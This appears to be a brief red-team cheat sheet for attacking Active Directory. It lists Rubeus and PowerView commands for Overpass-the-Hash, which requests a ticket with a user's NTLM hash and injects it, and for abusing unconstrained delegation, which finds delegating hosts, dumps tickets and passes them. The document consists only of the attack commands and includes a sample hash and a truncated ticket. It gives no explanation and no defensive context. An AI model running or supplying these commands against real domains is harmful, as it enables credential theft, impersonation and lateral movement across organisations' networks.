### Overpass-the-Hash
```
Rubeus triage
Rubeus asktgt /user:n.John /rc4:2e8a408a8aec852ef2e458b938b8c071
Rubeus ptt /ticket:doIFXDCCBVi[…snip…]bDWN5YmVyYm90aWMuaW8=
```
### Unconstrained Delegation
```
PowerShell Get-DomainComputer -Unconstrained -Properties DnsHostName
execute-assembly C:\Users\Public\Rubeus.exe triage
Rubeus dump /luid:0x1b37e  
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...]
```
